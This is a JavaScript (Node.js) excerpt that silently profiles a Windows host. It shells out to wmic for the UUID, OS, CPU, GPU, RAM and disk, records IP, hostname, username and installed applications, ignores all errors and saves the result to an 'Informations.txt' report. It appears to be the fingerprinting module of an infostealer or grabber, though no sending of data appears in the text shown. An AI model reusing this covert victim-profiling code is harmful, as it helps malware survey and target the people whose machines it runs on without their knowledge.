const util = require('util');
const exec = util.promisify(require('child_process').exec);

async function getCommand(cmd) {
    const { stdout, _ } = await exec(cmd);
    return stdout.replace(/\n/gm, "").replace(/\r/gm, "").trim();
}

async function getSysteminformations(ip, hostname) {
    let informations = core.getHeader();
    try {
        informations += `UUID: ${(await getCommand("wmic csproduct get uuid | more +1"))}\n`;
        informations += `IP: ${ip}\n`;
        informations += `HOSTNAME: ${hostname}\n`
        informations += `USERNAME: ${process.env.userprofile.split("\\")[2]}\n`
        informations += `OS: ${(await getCommand("wmic OS get caption, osarchitecture | more +1"))}\n`
        informations += `FileLocation: ${process.cwd()}\n`
        informations += `CPU: ${(await getCommand("wmic cpu get name | more +1"))}\n`
        informations += `GPU(s): ${(await getCommand("wmic PATH Win32_VideoController get name | more +1")).split("   ").join(", ")}\n`
        informations += `RAM: ${(await getCommand("wmic computersystem get totalphysicalmemory | more +1")).slice(0, 1)} GB\n`
        informations += `DISK: ${(await getDisk())} GB\n\n`
        informations += `───────────────────────\nApplications installed\n───────────────────────\n\n${(await getInstalledApplication())}\n`
    } catch (e) { }

    fs.writeFileSync(path.join(save.basepath, "Informations.txt"), informations);
    return informations;
}

async function getDisk() {
    size = (await getCommand('wmic logicaldisk get size | more +1')).split(' ')
    final = []
    for (let i = 0; i < size.length; i++) {
        if (size[i] != "") {
            final.push((parseInt(size[i]) / 2 ** 30).toString().split(".")[0])
        }
    }

    if (final.length == 0) {
        return "1000"
    }

    return final[0]
}